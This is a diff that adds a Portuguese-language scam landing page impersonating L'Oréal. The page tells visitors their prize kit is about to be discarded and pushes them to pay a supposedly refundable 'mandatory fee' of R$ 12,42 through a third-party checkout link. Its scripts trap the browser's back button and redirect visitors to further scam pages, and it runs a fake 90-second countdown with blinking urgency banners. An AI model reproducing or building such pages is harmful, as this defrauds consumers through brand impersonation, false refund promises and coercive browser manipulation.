@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>L'Oréal Paris - Última Chance Absoluta</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    
+    <script>
+        window.pixelId = "699052447f0cf151dff45c39";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script>
+        (function() {
+            const KEY = '__qs_entry__';
+            try {
+                if (!sessionStorage.getItem(KEY)) {
+                    sessionStorage.setItem(KEY, window.location.search || '');
+                }
+            } catch (e) {}
+            history.replaceState({ backtrap: 'root' }, '', location.pathname + (location.search || '') + location.hash);
+            history.pushState({ backtrap: 'guard' }, '');
+            window.addEventListener('popstate', function(ev) {
+                const st = ev.state || history.state;
+                if (!st || st.backtrap !== 'root') return;
+                let qs = '';
+                try {
+                    qs = location.search || sessionStorage.getItem(KEY) || '';
+                    if (qs && qs[0] !== '?') qs = '?' + qs;
+                } catch (e) {}
+                // Pode alterar para um link final de perda do kit ou manter em loop
+                location.replace('/elseve/up/1/back3' + (qs || '')); 
+            });
+        })();
+    </script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>    
+    
+    <style>
+        :root {
+            --pure-black: #000000;
+            --pure-white: #ffffff;
+            --error-red: #d93025;
+            --warning-bg: #fff5f5;
+            --success-green: #00a650;
+            --border: #E0E0E0;
+            --alert-yellow: #fbc02d;
+        }
+
+        body {
+            margin: 0; padding: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: #f2f2f2;
+            color: #1a1a1a;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        header {
+            padding: 20px 0;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+            background: var(--pure-white);
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+        }
+
+        .critical-alert {
+            background-color: var(--error-red);
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-size: 13px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { background-color: var(--error-red); }
+            50% { background-color: #a82018; }
+        }
+
+        .main-container {
+            max-width: 460px;
+            margin: 20px auto;
+            background: var(--pure-white);
+            padding: 35px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            border-radius: 8px;
+            animation: fadeIn 0.4s ease-out;
+            border-top: 5px solid var(--error-red);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .status-badge {
+            background: var(--error-red);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 800;
+            padding: 6px 14px;
+            display: inline-block;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-radius: 4px;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 15px;
+            color: var(--pure-black);
+            text-transform: uppercase;
+        }
+
+        p { font-size: 14px; color: #444; line-height: 1.6; margin-bottom: 15px; }
+
+        .highlight-text {
+            background: #fffde7;
+            padding: 15px;
+            border-left: 4px solid var(--alert-yellow);
+            border-radius: 4px;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .warning-box {
+            background-color: var(--warning-bg);
+            border: 1px dashed var(--error-red);
+            padding: 15px;
+            font-size: 13px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+            border-radius: 4px;
+            color: var(--error-red);
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .order-summary {
+            border: 2px solid var(--success-green);
+            padding: 20px;
+            margin-bottom: 25px;
+            text-align: center;
+            border-radius: 8px;
+            background: #f0fdf4;
+            position: relative;
+        }
+        .discount-tag {
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--error-red);
+            color: #fff;
+            font-size: 10px;
+            font-weight: 800;
+            padding: 4px 10px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
+
+        .order-summary span { display: block; font-size: 12px; color: #555; margin-bottom: 5px; font-weight: 700; text-transform: uppercase;}
+        .old-price { font-size: 16px; text-decoration: line-through; color: #999; }
+        .new-price { font-size: 38px; font-weight: 800; color: var(--success-green); display: block; line-height: 1; margin-top: 5px;}
+
+        /* BOTAO FINAL */
+        .btn-action {
+            display: block;
+            width: 100%;
+            background: var(--success-green);
+            color: #fff;
+            text-align: center;
+            padding: 22px;
+            border: none;
+            border-radius: 6px;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 800;
+            text-decoration: none;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(0, 166, 80, 0.4);
+            animation: pulse 1s infinite;
+            box-sizing: border-box;
+        }
+        .btn-action:active { transform: scale(0.98); }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+
+        .timer-msg {
+            text-align: center;
+            font-size: 13px;
+            margin-top: 20px;
+            color: #666;
+            font-weight: 600;
+        }
+        #timer { font-weight: 800; color: var(--error-red); font-size: 18px; }
+
+        @media (max-width: 600px) {
+            .main-container { margin: 15px; padding: 25px; }
+            h1 { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">L’ORÉAL</div>
+    </header>
+    
+    <div class="critical-alert">
+        SEU KIT SERÁ DESCARTADO DO SISTEMA EM SEGUNDOS!
+    </div>
+
+    <div class="main-container">
+        <div class="status-badge">ÚLTIMA CHANCE ABSOLUTA</div>
+        
+        <h1>Reduzimos a taxa para o custo mínimo - É pegar ou largar!</h1>
+
+        <p>A transportadora nos informou que o seu pedido está na <strong>zona de descarte</strong>. Para não deixarmos você perder seu Kit L'Oréal, o sistema liberou um voucher que corta a taxa mais da metade!</p>
+        
+        <div class="highlight-text">
+            <strong>Garantia de Reembolso Mantida:</strong> Mesmo sendo apenas R$ 12,42, esse valor continua sendo <strong>100% devolvido via PIX</strong> em 5 minutos. É estritamente para segurança administrativa da Nota Fiscal!
+        </div>
+
+        <div class="order-summary">
+            <div class="discount-tag">Mais de 50% OFF Aplicado</div>
+            <span>TAXA OBRIGATÓRIA REEMBOLSÁVEL</span>
+            <div class="old-price">De R$ 26,74</div>
+            <div class="new-price">Por R$ 12,42</div>
+        </div>
+
+        <div class="warning-box">
+            Se esta página expirar ou for fechada, seu envio será CANCELADO PERMANENTEMENTE e repassado para a fila de espera. Não haverá outra chance.
+        </div>
+
+        <a href="https://app.penguimpay.com/checkout/3ec90260-3ae8-4c1f-ae6e-b56d19094ad8" id="checkout-btn" class="btn-action">
+            PAGAR R$ 12,42 E LIBERAR PRÊMIO
+        </a>
+
+        <div class="timer-msg">
+            O sistema encerrará esta oferta em:<br><span id="timer">01:30</span>
+        </div>
+    </div>
+
+    <script>
+        // LÓGICA DE BACK-REDIRECT (BLOQUEIO DO VOLTAR)
+        (function() {
+            const destination = "https://ret-conoscagor.online/elseve/up/1/back3" + window.location.search;
+
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.pushState(null, null, location.href);
+                alert("FINALIZANDO... Se você sair agora, você perde o kit para sempre!");
+                window.location.href = destination;
+            };
+        })();
+
+        // TIMER REDUZIDO PARA 1:30 (URGÊNCIA EXTREMA)
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) timer = 0;
+            }, 1000);
+        }
+
+        window.onload = function() {
+            startTimer(90, document.querySelector('#timer')); // 1 minuto e 30 segundos
+            
+            // UTM Preserve
+            const btn = document.getElementById('checkout-btn');
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.toString() && btn) {
+                const cleanURL = btn.href.split('?')[0];
+                btn.href = cleanURL + "?" + urlParams.toString();
+            }
+        };
+    </script>
+</body>
+</html>
